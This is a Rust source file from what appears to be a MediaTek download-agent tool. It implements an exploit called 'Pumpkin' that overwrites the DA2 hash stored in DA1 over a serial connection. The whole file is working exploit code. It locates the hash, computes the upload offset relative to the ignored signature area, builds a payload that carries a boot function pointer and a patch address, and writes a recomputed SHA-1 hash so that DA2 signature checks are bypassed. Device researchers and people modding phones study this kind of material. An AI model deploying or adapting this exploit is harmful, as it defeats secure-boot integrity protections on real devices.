use crate::{
    err::Error,
    exploit::{Exploit, boot_da2, cmp},
};
use da_parser::da::hl::Region;
use da_patcher::Disassembler;
use derive_ctor::ctor;
use sha1::{Digest, Sha1};
use simpleport::{SimpleRead, SimpleWrite};

/// DA1 hash overwrite
///
/// ### How it works?
/// DA1 never checks for the payload address, so we can upload payload near to the ignored area (signature length, usually 256 bytes), hash the payload, and disable hash check for the real DA2.
#[derive(ctor)]
pub struct Pumpkin<'a> {
    da1: &'a Region,
    da2: &'a Region,
    payload: &'a [u8],
    da1_base: u32,
}

impl Exploit for Pumpkin<'_> {
    fn run(&self, port: &mut simpleport::Port) -> crate::Result<()> {
        let mut hasher = Sha1::new();
        hasher.update(self.da2.code());
        let hash = hasher.finalize();

        let code = self.da1.code();
        let offset = (0..self.da1.code().len())
            .find(|&i| code[i..].starts_with(&hash))
            .ok_or(Error::Custom("da2 hash not found :(".into()))?;

        // + 20 for hash size
        // - 16 for metadata
        let ignored_area = *self.da2.signature_len();
        port.write_u32_be(
            self.da1_base + offset as u32 + 20 - ignored_area - 16 - self.payload.len() as u32,
        )?;
        port.write_u32_be(self.payload.len() as u32 + ignored_area as u32 + 16)?;
        port.write_u32_be(self.payload.len() as u32 + ignored_area as u32 + 16)?;
        port.read_u8()?; // Always ok

        // This is a bit cursed here, because we need to hash metadata too...
        let disasm = Disassembler::try_new()?;
        // Jump address, the function to boot da2
        let boot_function = ((boot_da2(&disasm, code)? + self.da1_base) | 1).to_le_bytes();

        // Croissant2 original function, we don't need it here
        let original_function = 0u32.to_le_bytes();

        // Croissant2 pointer, we use it as mode switch too
        let mode = (b'p' as u32).to_le_bytes();

        // `cmp` instruction address
        let patch_address = (cmp(&disasm, code)? + self.da1_base).to_le_bytes();

        let payload = [
            &boot_function,
            &original_function,
            &mode,
            &patch_address,
            self.payload,
        ]
        .into_iter()
        .flatten()
        .map(|u| *u)
        .collect::<Vec<_>>();

        port.write_all(&payload)?;

        let mut hasher = Sha1::new();
        hasher.update(&payload);
        let hash = hasher.finalize();

        port.write_all(&vec![0; ignored_area as usize - 20])?;
        port.write_all(&hash)?;
        port.read_u8()?;
        port.read_u8()?;

        Ok(())
    }
}
